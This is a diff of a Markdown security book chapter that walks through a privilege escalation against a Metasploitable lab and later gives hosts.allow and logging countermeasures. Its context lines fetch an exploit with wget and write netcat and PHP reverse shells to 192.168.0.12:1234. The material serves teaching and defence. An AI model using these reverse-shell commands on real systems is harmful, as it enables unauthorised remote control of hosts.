@@ -206,7 +206,7 @@ So for example if root owns a file and the file has its `suid` bit set, anyone c
 
 ![](images/HandsOnHack.png)
 
-Just as I showed you in the Penetration Testing section of the Process and Practises chapter in Fascicle 0, we will now walk through the steps of how an attacker may carry out a privilege escalation. 
+We will now walk through the steps of how an attacker may carry out a privilege escalation.
 
 You can find the video of how it is played out at [https://youtu.be/ORey5Zmnmxo](https://youtu.be/ORey5Zmnmxo).
 
@@ -275,6 +275,7 @@ G> You can also see within the exploit that it adds executable permissions to ou
 G>
 G> Through our daemon shell that `distcc_exec` provided, let us fetch the exploit:  
 G> `wget --no-check-certificate https://www.exploit-db.com/download/8572 -O privesc.c`  
+G> The `no-check` is required because metasploitable does not have the relevant CA cert installed.  
 G> Now check that the file has the contents that you expect.  
 G> `cat privesc.c`
 G>
@@ -296,7 +297,7 @@ G> `echo '#!/bin/bash' > run`
 G> `echo '/bin/netcat -e /bin/bash 192.168.0.12 1234' >> run`  
 G> Another alternative is using php  
 G> `echo '#!/bin/bash' > run`  
-G> `echo "php -r '\$sock=fsockopen(\"192.168.0.12\",1234);exec(\"/bin/bash <&3 >&3 2>&3\");'" > run`  
+G> `echo "php -r '\$sock=fsockopen(\"192.168.0.12\",1234);exec(\"/bin/bash <&3 >&3 2>&3\");'" >> run`  
 G> There are also many other options [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to use for providing a reverse shell.
 
 {icon=bomb}
@@ -1602,7 +1603,7 @@ You can add `ALL:ALL` to your `hosts.deny`, but if you install a new service tha
 {title="/etc/hosts.allow", linenos=off, lang=Bash}
     rpcbind : 10.10.0.10 10.10.0.11 10.10.0.n
 
-    # Or if you are confident you have enough defence in depth and need to open to your network segment:
+    # Or if confident you have enough defence in depth and need open to your network segment:
     rpcbind : 10.10.0.0/24
 
 Prior to NFSv4 to achieve the same results, these two files would need to contain something similar to the following. [NFSv4 has no interaction](https://www.centos.org/docs/5/html/Deployment_Guide-en-US/ch-nfs.html) with these additional daemons, as their functionality has been incorporated into the version 4 protocol and NFS (v4) listens on the well known TCP port 2049:
@@ -1621,7 +1622,8 @@ Prior to NFSv4 to achieve the same results, these two files would need to contai
     rquotad : 10.10.0.10 10.10.0.11 10.10.0.n
     statd   : 10.10.0.10 10.10.0.11 10.10.0.n
 
-    # Or if you are confident you have enough defence in depth and need to open to your network segment:
+    # Or if you are confident you have enough defence in depth
+    # and need to open to your network segment:
     portmap : 10.10.0.0/24
     lockd   : 10.10.0.0/24
     mountd  : 10.10.0.0/24
@@ -1647,8 +1649,8 @@ Check which user has failed login attempts, mentioned this command previously:
 `lastb -ad`
 
 Check the most recent login of all users, or of a given user. `lastlog` sources data from the binary file:  
-`/var/log/lastlog`
-`lastlog`  
+`/var/log/lastlog`  
+`lastlog`
 
 #### Logging and Alerting {#vps-countermeasures-lack-of-visibility-logging-and-alerting}
 ![](images/ThreatTags/PreventionEASY.png)
